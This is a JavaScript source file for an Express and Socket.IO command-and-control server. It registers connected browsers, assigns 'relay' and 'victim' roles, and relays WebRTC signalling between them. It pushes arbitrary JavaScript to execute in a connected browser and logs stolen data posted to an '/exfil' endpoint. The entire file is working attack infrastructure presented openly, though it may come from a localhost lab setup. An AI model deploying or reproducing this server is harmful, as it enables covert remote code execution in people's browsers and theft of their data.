// server_for_c2.js
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const app = express();
const server = http.createServer(app);
const io = socketIo(server);

app.use(express.json({ limit: '1mb' }));
app.use(express.static('.'));

// Serve pixel.html implicitly via static; no need for explicit route

// Track browsers
const browsers = new Map();

// ========= NEW: Exfiltration endpoint =========
app.post('/exfil', express.json(), (req, res) => {
  console.log('🚨 EXFIL RECEIVED:', JSON.stringify(req.body, null, 2));
  res.sendStatus(200); // always 200 to avoid client errors
});

// ========= List browsers =========
app.get('/browsers', (req, res) => {
  const list = Array.from(browsers.entries()).map(([id, role]) => ({ id, role }));
  res.json(list);
});

// ========= Execute JS in first browser =========
app.post('/execute', (req, res) => {
  if (!req.body || typeof req.body.code !== 'string') {
    return res.status(400).json({ error: 'Expected { "code": "..." }' });
  }
  const originalCode = req.body.code;
  const wrappedCode = `
    (function() {
      window.__showAttackMsg = function(msg) {
        if (typeof window.showC2Msg === 'function') {
          window.showC2Msg(msg);
        } else {
          console.log('[ATTACK MSG]', msg);
        }
      };
      ${originalCode}
    })();
  `;
  if (browsers.size === 0) {
    return res.status(404).json({ error: 'No browsers connected' });
  }
  const firstId = browsers.keys().next().value;
  io.to(firstId).emit('execute', wrappedCode);
  res.json({ status: 'sent to browser', browser_id: firstId });
});

// ========= C2 control =========
app.post('/c2', (req, res) => {
  const { action, browser_id, code } = req.body;
  if (!action) return res.status(400).json({ error: 'Missing "action"' });

  if (action === 'send_to_victim') {
    for (let [id, role] of browsers) {
      if (role === 'relay') {
        io.to(id).emit('c2_command', { action: 'send_to_victim', code });
        return res.json({ status: 'Command relayed via browser C2' });
      }
    }
    return res.status(404).json({ error: 'No C2 relay found' });
  }

  if (action === 'become_relay' || action === 'become_victim') {
    if (!browser_id || !browsers.has(browser_id)) {
      return res.status(404).json({ error: 'Browser ID not found' });
    }
    const role = action === 'become_relay' ? 'relay' : 'victim';
    browsers.set(browser_id, role);
    io.to(browser_id).emit('c2_command', { action });
    return res.json({ status: `Assigned ${role} role to browser ${browser_id}` });
  }

  res.status(400).json({ error: 'Unknown action' });
});

// ========= Socket.IO =========
io.on('connection', (socket) => {
  console.log('Browser connected:', socket.id);
  browsers.set(socket.id, null);

  socket.on('browser_ready', () => {
    console.log('Browser ready:', socket.id);
  });

  socket.on('webrtc_offer', (offer) => {
    console.log('WebRTC offer from relay');
    for (let [id, role] of browsers) {
      if (role === 'victim') {
        io.to(id).emit('webrtc_answer_request', offer);
        break;
      }
    }
  });

  socket.on('webrtc_answer', (answer) => {
    console.log('WebRTC answer from victim');
    for (let [id, role] of browsers) {
      if (role === 'relay') {
        io.to(id).emit('webrtc_answer_received', answer);
        break;
      }
    }
  });

  socket.on('disconnect', () => {
    console.log('Browser disconnected:', socket.id);
    browsers.delete(socket.id);
  });
});

// ========= Start =========
const PORT = 3000;
server.listen(PORT, () => {
  console.log(`✅ Server running on http://localhost:${PORT}`);
  console.log(`➡ Open http://localhost:${PORT}/working_c2_browser_pixel.html`);
  console.log(`➡ Use /browsers to list connected browsers`);
});
